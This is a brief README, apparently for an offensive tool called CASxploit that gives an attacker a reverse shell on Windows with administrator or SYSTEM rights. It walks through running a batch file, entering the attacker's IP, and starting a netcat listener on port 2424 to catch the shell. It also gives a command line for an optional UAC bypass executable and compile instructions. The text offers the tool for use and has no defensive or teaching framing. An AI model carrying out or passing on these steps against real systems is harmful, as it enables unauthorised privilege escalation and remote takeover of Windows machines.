# CASxploit: Windows SYSTEM Reverse Shell

## Usage
1. Run `run_as_admin.bat`.
2. Enter your `LHOST` (your local IP address).
3. Start your listener: `nc -lvnp 2424`
4. The `ADMINISTRATOR` shell will connect back to you.

## UAC Bypass (Optional)
```cmd
.\uacbypass.exe 67 "FULL_PATH_TO_BAT_FILE"
```

## Compilation
Open `CASxploit.sln` with Visual Studio 2022 and press **F7** to compile.
